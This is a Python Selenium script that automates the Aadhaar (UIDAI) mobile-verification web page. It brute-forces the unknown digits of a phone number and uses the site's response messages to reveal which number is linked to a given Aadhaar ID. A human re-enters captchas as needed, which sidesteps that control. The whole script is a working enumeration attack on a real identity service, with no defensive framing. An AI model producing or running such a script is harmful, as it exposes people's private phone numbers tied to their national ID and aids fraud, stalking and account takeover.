from time import sleep
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import ChromiumOptions
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


def generate_combinations():
    suffix = '6136'

    for prefix in (8885,8884):  #Enter the first 4 digits of the number
        for digit5 in range(10):
            for digit6 in range(10):
                yield f'{prefix}{digit5}{digit6}{suffix}'


def get_chromedriver(driver_path=None):
    from webdriver_manager.chrome import ChromeDriverManager

    if driver_path:
        return driver_path
    try:
        return ChromeDriverManager().install()
    except Exception as e:
        print("Failed to get ChromeDriver path using webdriver_manager:", e)
        return "/path/to/chromedriver"


options = ChromiumOptions()
driver_path = get_chromedriver()
driver = webdriver.Chrome(options=options)
url = "https://myaadhaar.uidai.gov.in/verify-email-mobile"

driver.get(url)

command = input('\nAdd IDs for number input, submit buttons, aadhar number, and captcha.\n\nShall I start? > ')

failure_message = 'The Mobile number you have entered does not match with our records'.lower()
success_message1 = 'The mobile number you have entered is already verified with our records'.lower()
success_message2 = 'Verification OTP has been sent successfully'.lower()

try:
    number_input = driver.find_element(By.ID, "n")
    submit_button = driver.find_element(By.ID, "s")


    def check_number(number):
        number_input.send_keys(Keys.CONTROL + "a")
        number_input.send_keys(Keys.DELETE)
        sleep(1)
        number_input.send_keys(number)
        sleep(1)
        submit_button.click()
        sleep(2)

        try:
            alert_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CLASS_NAME, 'Toastify__toast-body'))
            )
            message = alert_element.get_attribute('textContent').lower()
            alert_element.click()

            if failure_message in message:
                print(f'Not matched: {number}')
            elif success_message1 in message or success_message2 in message:
                print(f'\n\n\nYay!!! Match found: {number}\n\n\n')
                return True
            else:
                print('\nLooks like captcha has been changed. Enter updated captcha.')
                return False
        except Exception as e:
            print('\nGot error on getting alert message')
            return False


    for number in generate_combinations():
        matched = False
        while matched is False:
            matched = check_number(number)
            if matched is False:
                command = input('\n\nShall I start? > ')
        if matched:
            break
except Exception as e:
    print('Number or Button elements are not found', e)
finally:
    driver.quit()
